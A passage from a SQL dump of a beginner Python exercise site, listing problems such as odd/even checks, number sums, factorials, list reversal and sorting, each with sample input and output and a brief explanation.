2:\r\n</p><p style=\"line-height: 1;\">8 1\r\n</p><p style=\"line-height: 1;\">Sample Output 2:\r\n</p><p style=\"line-height: 1;\">Set\r\nExplanation:\r\n0000 1000</p>','B','','prog/python/bitcheck.py','<p style=\"line-height: 1;\">left shift the number num by n-1 times move the nth bit to LSB.</p><p style=\"line-height: 1;\">\r\nDo AND operation between num and 1, if the LSB is 1 then output is 1, if LSB is 0 then output is 0.</p>',16,NULL,NULL,NULL),(927,'odd or even using bitwise operator in python','odd-or-even-using-bitwise-operator-in-python','<p style=\"line-height: 1;\">Python Program to get a number num and check whether num is odd or even using bit wise operator.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\"> 45\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">ODD</p><p style=\"line-height: 1;\">Sample Input 2:</p><p style=\"line-height: 1;\">\r\n56</p><p style=\"line-height: 1;\">Sample Output 2:\r\n</p><p style=\"line-height: 1;\">EVEN</p>','B','','prog/python/odd_even_b.py','<p style=\"line-height: 1;\">last bit(LSB) is 0 for all even numbers and 1 for all odd numbers.\r\n</p><p style=\"line-height: 1;\">Example : 2 - 0000 0010, 8 - 0000 1000 and 5 - 0000 0101\r\n                     </p>',16,NULL,NULL,NULL),(928,'Print Natural numbers in pyhon','Print-Natural-numbers-in-pyhon','<p style=\"line-height: 1;\">Python program to get input n and print natural numbers till n.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">7\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">1 2 3 4 5 6 7</p>','B','','prog/python/natural.py','<p style=\"line-height: 1;\">For Statement is used to execute the sequence of instruction repeatedly.</p><p style=\"line-height: 1;\">\r\nRange() method gives list of elements, here range() method gives list which has 1,2,3... to n.\r\nfor statement executes the instructions iteratively and for takes the elements one by one as value of i in sequential manner.</p><p style=\"line-height: 1;\">\r\nso it prints 1 to n.</p>',17,NULL,NULL,NULL),(929,'Print Whole numbers in python','Print-Whole-numbers-in-python','<p style=\"line-height: 1;\">Python program to get input n and print  whole numbers till n.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">7\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">0 1 2 3 4 5 6 7</p>','B','','prog/python/whole.py','<p style=\"line-height: 1;\">For Statement is used to execute the sequence of instruction repeatedly.\r\n</p><p style=\"line-height: 1;\">Range() method gives list of elements, here range() method gives list which has 0,1,2,3... to n.\r\nfor statement executes the instructions iteratively and for takes the elements one by one as value of i in sequential manner.\r\n</p><p style=\"line-height: 1;\">so it prints 0 to n.</p>',17,NULL,NULL,NULL),(930,'Print ODD numbers in python','Print-ODD-numbers-in-python','<p style=\"line-height: 1;\">Python program to get input n and print odd numbers till n.</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">7\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">1 3 5 7</p>','B','','prog/python/odd.py','<p style=\"line-height: 1;\">For Statement is used to execute the sequence of instruction repeatedly.</p><p style=\"line-height: 1;\">\r\nRange() method gives list of elements, here range() method gives list which has 1,3,5... to n or n-1.\r\nfor statement executes the instructions iteratively and for takes the elements one by one as value of i in sequential manner.</p><p style=\"line-height: 1;\">\r\nso it prints 1,3,5...n or n-1</p>',17,'','raptor/odd_numbers_Txsm61t.PNG',''),(931,'Print Even numbers in python','Print-Even-numbers-in-python','<p style=\"line-height: 1;\">Python program to get input n and print even numbers till n.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">7\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">2 4 6</p>','B','','prog/python/even.py','<p style=\"line-height: 1;\">For Statement is used to execute the sequence of instruction repeatedly.\r\n</p><p style=\"line-height: 1;\">Range() method gives list of elements, here range() method gives list which has 2,4,6... to n or n-1.\r\nfor statement executes the instructions iteratively and for takes the elements one by one as value of i in sequential manner.</p><p style=\"line-height: 1;\">\r\nso it prints 2,4,6...n or n-1</p>',17,NULL,NULL,NULL),(932,'Print Natural numbers in reverse in python','Print-Natural-numbers-in-reverse-in-python','<p style=\"line-height: 1;\">Python program to get input n and print natural numbers from n in reverse.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">7\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">7 6 5 4 3 2 1</p>','B','','prog/python/natural_rev.py','<p style=\"line-height: 1;\">For Statement is used to execute the sequence of instruction repeatedly.</p><p style=\"line-height: 1;\">Range() method gives list of elements, here range() method gives list which has n,n-1,.....,1.\r\nfor statement executes the instructions iteratively and for takes the elements one by one as value of i in sequential manner.\r\n</p><p style=\"line-height: 1;\">so it prints  n,n-1,.....,1.</p>',17,NULL,NULL,NULL),(933,'Sum of natural numbers in python','Sum-of-natural-numbers-in-python','<p style=\"line-height: 1;\">Python program to get input n and calculate the sum of first n natural numbers.</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">5\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">15(1+2+3+4+5)</p>','B','','prog/python/natural_sum.py','<p style=\"line-height: 1;\">For Statement is used to execute the sequence of instruction repeatedly.\r\n</p><p style=\"line-height: 1;\">Range() method gives list of elements, here range() method gives list which has 1,2,3... to n.\r\nfor statement executes the instructions iteratively and for takes the elements one by one as value of i in sequential manner.\r\n</p><p style=\"line-height: 1;\">so it adds i with sum1 in every iteration, finally produces sum of natural numbers.</p>',17,NULL,NULL,NULL),(934,'N ODD numbers in python','N-ODD-numbers-in-python','<p style=\"line-height: 1;\">Python program to get input n and print n odd numbers.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">7\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">1 3 5 7 9 11 13</p>','B','','prog/python/nodd.py','while(i<n) iterates its instructions for n times, since i is incremented by one. On each iteration j prints odd numbers, since it is intialized with 1 and incremented by two.',17,NULL,NULL,NULL),(935,'N Even numbers in python','N-Even-numbers-in-python','<p style=\"line-height: 1;\">Python program to get input n and print n even numbers.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\n7\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">2 4 6 8 10 12 14</p>','B','','prog/python/neven.py','while(i<n) iterates its instructions for n times, since i is incremented by one. On each iteration j prints even numbers, since it is intialized with 2 and incremented by two.',17,NULL,NULL,NULL),(936,'sum of Even numbers in python','sum-of-Even-numbers-in-python','<p style=\"line-height: 1;\">Python program to get input n and calculate the sum of even numbers till n\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">5</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\n6(2+4)</p>','B','','prog/python/even_sum.py','<p style=\"line-height: 1;\">For Statement is used to execute the sequence of instruction repeatedly.\r\n</p><p style=\"line-height: 1;\">Range() method gives list of elements, here range() method gives list which has 2,4,6... to n or n-1.\r\n</p><p style=\"line-height: 1;\">for statement executes the instructions iteratively and for takes the elements one by one as value of i in sequential manner.\r\n</p><p style=\"line-height: 1;\">so it adds even numbers. </p>',17,NULL,NULL,NULL),(937,'Sum of odd numbers in pyhton','Sum-of-odd-numbers-in-pyhton','<p style=\"line-height: 1;\">Python program to get input n and calculate the sum of odd numbers till n\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">5\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">9(1+3+5)</p>','B','','prog/python/odd_sum.py','<p style=\"line-height: 1;\">For Statement is used to execute the sequence of instruction repeatedly.</p><p style=\"line-height: 1;\">\r\nRange() method gives list of elements, here range() method gives list which has 1,3,5... to n or n-1.\r\nfor statement executes the instructions iteratively and for takes the elements one by one as value of i in sequential manner.\r\n</p><p style=\"line-height: 1;\">so it adds odd numbers. </p>',17,NULL,NULL,NULL),(938,'Sum of n numbers in python','Sum-of-n-numbers-in-python','<p style=\"line-height: 1;\">Python program to get input n and n inputs and calculate the sum of n inputs.</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">4\r\n6 5 3 2</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">16(6+5+3+2)</p>','B','','prog/python/sumofnnumbers.py','<p style=\"line-height: 1;\">For Statement is used to execute the sequence of instruction repeatedly.\r\n</p><p>Range() method gives list of elements, here range() method gives list which has 1,2,3... to n.\r\nfor statement executes the instructions iteratively and takes input from user through input() method. </p><p>number taken from user in each iteration will be summed.</p>',17,NULL,NULL,NULL),(939,'First digit of number in python','First-digit-of-number-in-python','<p style=\"line-height: 1;\">Python program to get input num and display the first digit of number num\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">675\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">6</p>','B','','prog/python/first_digit.py','Given number is continuously divided by 10, till it becomes lesser than 10 and greater than 0. and the final answer is first digit of given number.',17,NULL,NULL,NULL),(940,'First digit of number is odd or even in python','First-digit-of-number-is-odd-or-even-in-python','<p style=\"line-height: 1;\">Python program to get input num and check whether the first digit of number num is odd or even\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">34\r\n</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">ODD</p><p style=\"line-height: 1;\">Sample Input 2:</p><p style=\"line-height: 1;\">\r\n67</p><p style=\"line-height: 1;\">Sample Output 2:\r\n</p><p style=\"line-height: 1;\">Even</p>','B','','prog/python/first_digitoe.py','<p style=\"line-height: 1;\">Given number is continously divided by 10, till it becomes lesser than 10 and greater than 0. and the final answer is first digit of given number.</p><p style=\"line-height: 1;\"> \r\nIf the first digit is divided by 2 then it is odd else it is Even.</p>',17,NULL,NULL,NULL),(941,'Multiply without * operator in Python','Multiply-without-operator-in-Python','<p style=\"line-height: 1;\">Python program to get two inputs  num1 and num2, compute the product of num1 and num2 without using  * operator\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">5 \r\n6\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">30</p>','B','','prog/python/multiplyw.py','<p style=\"line-height: 1;\">Insteaded multiply num1 and num2, just add num1 for num2 times.\r\n</p><p style=\"line-height: 1;\">For Example:\r\nnum1 =4 and num2 = 3\r\n4+4+4=12.</p>',17,NULL,NULL,NULL),(942,'Multiplication Table in Python','Multiplication-Table-in-Python','<p style=\"line-height: 1;\">Python program to get input n and print the multiplication table of n\r\n</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\n4\r\n</p><p style=\"line-height: 1;\">Sample output 1:\r\n</p><p style=\"line-height: 1;\">1X4=4\r\n2X4=8\r\n3X4=12\r\n4X4=16\r\n5X4=20\r\n6X4=24\r\n7X4=28\r\n8X4=32\r\n9X4=36\r\n10X4=40</p>','B','','prog/python/mtable.py','<p style=\"line-height: 1;\">Here i is initialized to 1 and incremented by 1 for each iteration, instructions inside the <b>for</b> block are executed unless i becomes greater than10. </p><p style=\"line-height: 1;\">so value of i (1,2,3,...10)will be multiplied with n and printed in table format.\r\n\r\n</p>',17,NULL,NULL,NULL),(943,'Multiplication Table in Python till M','Multiplication-Table-in-Python-till-M','<p style=\"line-height: 1;\">Python program to get input n and m, print the multiplication table of n till m\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">4 \r\n7\r\n</p><p style=\"line-height: 1;\">Sample output 1:\r\n</p><p style=\"line-height: 1;\">1X4=4\r\n2X4=8\r\n3X4=12\r\n4X4=16\r\n5X4=20\r\n6X4=24\r\n7X4=28</p>','B','','prog/python/mtablem.py','<p style=\"line-height: 1;\">Here i is initialized to 1 and incremented by 1 for each iteration, instructions inside the <b>for</b> block are executed unless i becomes greater than m. </p><p style=\"line-height: 1;\">so value of i (1,2,3,...m)will be multiplied with n and printed in table format.\r\n\r\n</p>',17,NULL,NULL,NULL),(944,'Sum of postive numbers in python','Sum-of-postive-numbers-in-python','<p>Python program to get input n and n positive integers (skip the negative number), then compute the sum of positive integers\r\n</p><p>Sample Input 1:\r\n</p><p>5\r\n6 7 2 -8 1 8\r\n</p><p>Sample Output 1:\r\n</p><p>24</p>','B','','prog/python/sumofnumbers.py','since 1 is always true, input() statement gets input from user continously,\r\nif user enters a negative number it exit from while loop using break statement.',17,NULL,NULL,NULL),(945,'Decimal to Binary in Python','Decimal-to-Binary-in-Python','<p style=\"line-height: 1;\">Python program to get decimal number and convert it into binary.</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\n11\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">1011\r\n</p>','B','','prog/python/dtob.py','Yet to be updated',17,NULL,NULL,NULL),(946,'Binary to Decimal in python','Binary-to-Decimal-in-python','<p style=\"line-height: 1;\">Python program to get binary number and convert it into decimal number.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">1010\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">10\r\n</p>','B','','prog/python/btod.py','Yet to be updated',17,NULL,NULL,NULL),(947,'Factorial in Python','Factorial-in-Python','<p style=\"line-height: 1;\">Python program to find factorial of n\r\n</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\"> 5\r\n</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\"> 120</p>','B','','prog/python/factorial.py','<p style=\"line-height: 1;\">For Statement is used to execute the sequence of instruction repeatedly.</p><p style=\"line-height: 1;\">Range() method gives list of elements, here range() method gives list which has 1,2,3... to n.\r\nfor statement executes the instructions iteratively and for takes the elements one by one as value of i in sequential manner.\r\n</p><p style=\"line-height: 1;\">so it multiplies with fact in every iteration, finally produces product of n natural numbers.</p>',17,'','raptor/factorial.PNG',''),(948,'list input in python','list-input-in-python','<p style=\"line-height: 1;\">Python Program to get list size n and n elements of list, then print the elements.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">5\r\n5 7 9 3 1\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">5 7 9 3 1</p>','B','','prog/python/input_list.py','<p style=\"line-height: 1;\">To get list of numbers separated by space, use split(\" \") method.</p><p style=\"line-height: 1;\">Split() method splits the numbers as separate elements. </p><p style=\"line-height: 1;\">\r\nBy default this methods are considered as string, since input() method returns string.\r\n\r\nUse map() function to convert all elements as integer and store it in list.</p>',18,NULL,NULL,NULL),(949,'sum of list in python | without using built-in function','sum-of-list-in-python-without-using-built-in-function','<p style=\"line-height: 1;\">Python Program to get list size n and n elements of list, then compute sum of the elements.</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">5\r\n5 7 9 3 1\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">25</p>','B','','prog/python/list_sum.py','<p style=\"line-height: 1;\">Input:\r\nTo get list of numbers seprated by space, use split(\" \") method. </p><p style=\"line-height: 1;\">Split() method splits the numbers as seprate elements. </p><p style=\"line-height: 1;\">\r\nBy default this methods are considered as string, since input() method returs string.\r\n\r\nUse map() function to convert all elements as integer and store it in list.\r\n</p><p style=\"line-height: 1;\">\r\nProcess:\r\nfor statement takes the elements in the list l one by one as value of i, and adds i on each iteration with sum1.\r\n\r\nFinally sum1 is sum of list elements.\r\n\r\n</p>',18,NULL,NULL,NULL),(950,'Average of list in python | without using built-in function','Average-of-list-in-python-without-using-built-in-function','<p style=\"line-height: 1;\">Python Program to get list size n and n elements of list, then compute sum and average of the elements.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">5\r\n5 7 9 3 1</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">25\r\n5.0</p>','B','','prog/python/average_list.py','<p style=\"line-height: 1;\">Input:\r\nTo get list of numbers seprated by space, use split(\" \") method. </p><p style=\"line-height: 1;\">Split() method splits the numbers as seprate elements.</p><p style=\"line-height: 1;\"> \r\nBy default this methods are considered as string, since input() method returs string.</p><p style=\"line-height: 1;\">\r\n\r\nUse map() function to convert all elements as integer and store it in list.\r\n</p><p style=\"line-height: 1;\">\r\nProcess:\r\nfor statement takes the elements in the list l one by one as value of i, and adds i on each iteration with sum1.\r\n</p><p style=\"line-height: 1;\">\r\nFinally sum1/len(l) is average of list elements.\r\n\r\n</p>',18,'','raptor/average_of_list_pqYo0vf.png',''),(951,'linear search in python','linear-search-in-python','<p style=\"line-height: 1;\">Python Program to get an element and find the location of element in list, print -1 if element is not found.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">5\r\n5 7 9 3 1\r\n9\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">2\r\n</p><p style=\"line-height: 1;\">Sample Input 2:</p><p style=\"line-height: 1;\">5\r\n5 7 9 3 1\r\n4\r\n</p><p style=\"line-height: 1;\">Sample Output 2:\r\n</p><p style=\"line-height: 1;\">-1</p>','B','','prog/python/search.py','<p style=\"line-height: 1;\">Input:\r\nTo get list of numbers seprated by space, use split(\" \") method. </p><p style=\"line-height: 1;\">Split() method splits the numbers as seprate elements.</p><p style=\"line-height: 1;\"> \r\nBy default this methods are considered as string, since input() method returs string.\r\n</p><p style=\"line-height: 1;\">\r\nUse map() function to convert all elements as integer and store it in list.\r\n</p><p style=\"line-height: 1;\">\r\nProcess:\r\nfor statement takes the elements given by range(0,len(l)) method one by one as value of i, and  i acts as an index of list. [0,1,2.......len(l)-1]\r\n\r\nif element is found in any list[i] then it returns the location i, else it prints \"element not found\".\r\n</p><p style=\"line-height: 1;\">\r\nNote :\r\nIn Python, for also have else statement. if the loop does not exists by break statement, then else part will be executed.\r\n\r\n</p>',18,NULL,NULL,NULL),(952,'largest element in the list python | without using built-in function','largest-element-in-the-list-python-without-using-built-in-function','<p style=\"line-height: 1;\">Python Program to get list size n and n elements of list, then find the largest element among those elements.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">5\r\n5 7 9 3 1\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">9</p>','B','','prog/python/largestinlist.py','<p style=\"line-height: 1;\">Input:\r\nTo get list of numbers seprated by space, use split(\" \") method. </p><p style=\"line-height: 1;\">Split() method splits the numbers as seprate elements. \r\nBy default this methods are considered as string, since input() method returs string.\r\n</p><p style=\"line-height: 1;\">\r\nUse map() function to convert all elements as integer and store it in list.</p><p style=\"line-height: 1;\">\r\n\r\nProcess:\r\nassign the element located at 0 to max1 using max1 = l[0].\r\n</p><p style=\"line-height: 1;\">\r\nusing for loop  visit each  location serially from 1 to len(l)-1. if the element located in any position is greater than max1,  then assign the element as max by using max1 = l[i] \r\n\r\nfinally max1 holds the maximum value in the list.</p>',18,NULL,NULL,NULL),(953,'smallest element in the list python | without using built-in function','smallest-element-in-the-list-python-without-using-built-in-function','<p style=\"line-height: 1;\">Python Program to get list size n and n elements of list, then find the smallest element among those elements. </p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">5\r\n5 7 9 3 1</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">1</p>','B','','prog/python/smallestinlist.py','<p style=\"line-height: 1;\">Input:\r\nTo get list of numbers seprated by space, use split(\" \") method.</p><p style=\"line-height: 1;\">Split() method splits the numbers as seprate elements. </p><p style=\"line-height: 1;\">\r\nBy default this methods are considered as string, since input() method returs string.\r\n\r\nUse map() function to convert all elements as integer and store it in list.\r\n</p><p style=\"line-height: 1;\">\r\nProcess:\r\n\r\nInitially assign the element located at 0 to min using min = l[0].\r\n</p><p style=\"line-height: 1;\">\r\nusing for loop visit each  location serially from 1 to len(l)-1. if the element located in any position is lesser than min,  then assign the element as min by using min = l[i] \r\n\r\nfinally min holds the minimum value in the list.</p>',18,NULL,NULL,NULL),(954,'Print all the numbers which are less than given key element from a given list.','Print-all-the-numbers-which-are-less-than-given-key-element-from-a-given-list','<p style=\"line-height: 1;\">Python Program to get an element and print the elements of list which is lesss than the element.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\n5\r\n5 7 9 3 1\r\n4</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\n3 1</p><p style=\"line-height: 1;\">Sample Input 2:\r\n</p><p style=\"line-height: 1;\">5\r\n5 7 9 3 1\r\n8\r\n</p><p style=\"line-height: 1;\">Sample Output 2:\r\n</p><p style=\"line-height: 1;\">5 7 3 1</p>','B','','prog/python/smallerthanelement.py','<p style=\"line-height: 1;\">Input:\r\nTo get list of numbers seprated by space, use split(\" \") method. </p><p style=\"line-height: 1;\">Split() method splits the numbers as seprate elements. </p><p style=\"line-height: 1;\">\r\nBy default this methods are considered as string, since input() method returs string.\r\n\r\nUse map() function to convert all elements as integer and store it in list.\r\n</p><p style=\"line-height: 1;\">\r\nProcess:\r\n\r\nusing for loop visit each  location sequentially from 1 to len(l)-1. if the value located in a postion is lesser than the element given by user, then print the value using print statement.</p>',18,NULL,NULL,NULL),(955,'delete element in list python','delete-element-in-list-python','<p style=\"line-height: 1;\">Python Program to get an element and delete the element from list.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">5\r\n5 7 9 3 1\r\n9</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">5 7 3 1</p>','B','','prog/python/deleteelement.py','<p style=\"line-height: 1;\">visit every location in the list\r\n \r\nif current element in list l[i] is equal to the element which is to be deleted.</p><p style=\"line-height: 1;\"> Then move all the elements located after i to its previous position using:\r\n l[i] = l[i+1]\r\n\r\n</p>',18,NULL,NULL,NULL),(956,'Revese the elements in list python','Revese-the-elements-in-list-python','<p style=\"line-height: 1;\">Python Program to get list size n and n elements of list, then reverse the n elements.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\n5\r\n5 7 9 3 1\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">1 3 9 7 5</p>','B','','prog/python/reverselist.py','<p style=\"line-height: 1;\">initialize start to first location of list and stop to last location of list using\r\nstart=0\r\nstop=len(l)-1\r\n\r\nswap the elements in location start and stop, then increment start by 1 and decrement stop by 1.\r\n</p><p style=\"line-height: 1;\">l[start],l[stop]=l[stop],l[start]\r\n\r\nrepeat the above step till start is less than stop</p>',18,NULL,NULL,NULL),(957,'Reverse the first half of list elements in python','Reverse-the-first-half-of-list-elements-in-python','<p style=\"line-height: 1;\">Python Program to get list size n and n elements of list, then reverse the first n/2 elements.</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">5\r\n5 7 9 3 1\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">7 5 9 3 1</p>','B','','prog/python/reverse1half.py','<p style=\"line-height: 1;\">initialize start to first location of list and stop to last location of list using\r\nstart=0\r\nstop=len(l)/2-1\r\n\r\nswap the elements in location start and stop, then increment start by 1 and decrement stop by 1.\r\n</p><p style=\"line-height: 1;\">l[start],l[stop]=l[stop],l[start]\r\n\r\nrepeat the above step till start is less than stop</p>',18,NULL,NULL,NULL),(958,'Reverse the second half of list elements in python','Reverse-the-second-half-of-list-elements-in-python','<p style=\"line-height: 1;\">Python Program to get list size n and n elements of list, then reverse the second n/2 elements.</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">5\r\n5 7 9 3 1</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">5 7 1 3 9</p>','B','','prog/python/reverse2half.py','initialize start to first location of list and stop to last location of list using\r\nstart=len(l)/2\r\nstop=len(l)-1\r\n\r\nswap the elements in location start and stop, then increment start by 1 and decrement stop by 1.\r\nl[start],l[stop]=l[stop],l[start]\r\n\r\nrepeat the above step till start is less than stop',18,NULL,NULL,NULL),(959,'list sort python','list-sort-python','<p style=\"line-height: 1;\">Python Program to get list size n and n elements of list, then sort the elements of list in ascending order.</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">5\r\n5 7 9 3 1</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">1 3 5 7 9</p>','B','','prog/python/sortelements.py','Bubble Sort Algorithm: \r\nRefer : https://www.tutorialspoint.com/data_structures_algorithms/bubble_sort_algorithm.htm',18,NULL,NULL,NULL),(960,'list sort descending order python','list-sort-descending-order-python','<p style=\"line-height: 1;\">Python Program to get list size n and n elements of list, then sort the elements of list in descending order.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\n5\r\n5 7 9 3 1</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">9 7 5 3 1</p>','B','','prog/python/sortelementsd.py','Bubble Sort Algorithm: \r\nRefer : https://www.tutorialspoint.com/data_structures_algorithms/bubble_sort_algorithm.htm',18,NULL,NULL,NULL),(961,'Python Program to sort half of the list elements in ascending order and next half in descending order.','Python-Program-to-sort-half-of-the-list-elements-in-ascending-order-and-next-half-in-descending-order','<p style=\"line-height: 1;\">Python Program to get list size n and n elements of list, then sort the first half elements of list in ascending order and sort second half elements of list in descending order.</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">5\r\n5 7 9 3 1\r\n</p><p style=\"line-height: 1;\">Sample Output:\r\n</p><p style=\"line-height: 1;\">1 3 9 7 5</p>','B','','prog/python/halfsort.py','Bubble Sort Algorithm: \r\nRefer : https://www.tutorialspoint.com/data_structures_algorithms/bubble_sort_algorithm.htm',18,NULL,NULL,NULL),(962,'merging two lists in python','merging-two-lists-in-python','<p style=\"line-height: 1;\">Python Program to get two lists and merge them into single list.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">3\r\n5 4 2\r\n4\r\n9 7 6 3</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">5 4 2 9 7 6 3</p>','B','','prog/python/merge_list.py','Create a new list with size of size of a list  + size of b list.\r\nl3  = len(l1) + len(l2)\r\n \r\nvisit elements of list l1 and store it in l3.\r\nl3[k]=l1[i]\r\n\r\nvisit elements of list l2 and store it in l3.\r\nl3[k]=l2[i]',18,NULL,NULL,NULL),(963,'Python Program to replace every element with the greatest element on right side','Python-Program-to-replace-every-element-with-the-greatest-element-on-right-side','<p style=\"line-height: 1;\">Python Program to get list size n and n elements of list, replace every elements with the greatest element located in right side.</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">5\r\n5 7 9 3 1</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">9 9 3 3 1</p>','B','','prog/python/replacelargest.py','visit each location in list\r\n\r\nfind the greatest element (max1)next to the location using\r\n\r\nStore the max1 in current location by\r\nl[i] = max1',18,NULL,NULL,NULL),(964,'circular list rotation in python','circular-list-rotation-in-python','<p style=\"line-height: 1;\">Python Program to get list size n and n elements of list, rotate the elements of list in left side for m times.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">5\r\n5 7 9 3 1\r\n2\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">9 3 1 5 7</p>','B','','prog/python/circular_list_rotation.py','repeat the below steps for r times:\r\n\r\nstore the l[0] in temp\r\ntemp=l[0]\r\n\r\nmove all elements located in 1 to len(l)-1 to its previous location\r\nl[j]=l[j+1]\r\n\r\nstore the temp in l[len(l)-1]\r\nl[len(l)-1]=temp',18,NULL,NULL,NULL),(965,'length of the string in python','length-of-the-string-in-python','<p style=\"line-height: 1;\">python program to get a String and count the characters in the string\r\n</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">Hello\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">5</p>','B','','prog/python/lengthstring.py','for statement visits all the elements in the string s\r\nfor i in s\r\n\r\ncount the number of iterations by\r\nlength+=1',19,NULL,NULL,NULL),(966,'find a character in a String Python','find-a-character-in-a-String-Python','<p style=\"line-height: 1;\">python program to get a String and a character then find where the character occurred first in the string.\r\n</p><p style=\"line-height: 1;\">Sample Input 1 :\r\n</p><p style=\"line-height: 1;\">Hello\r\nl</p><p style=\"line-height: 1;\">Sample Output 1 :\r\n</p><p style=\"line-height: 1;\">2</p>','B','','prog/python/locationofchar.py','Visit each location in string s one by one \r\nfor i in range(0,len(s)):\r\n\r\nif character c is found, return th location i',19,NULL,NULL,NULL),(967,'occurences of character in string python','occurences-of-character-in-string-python','<p 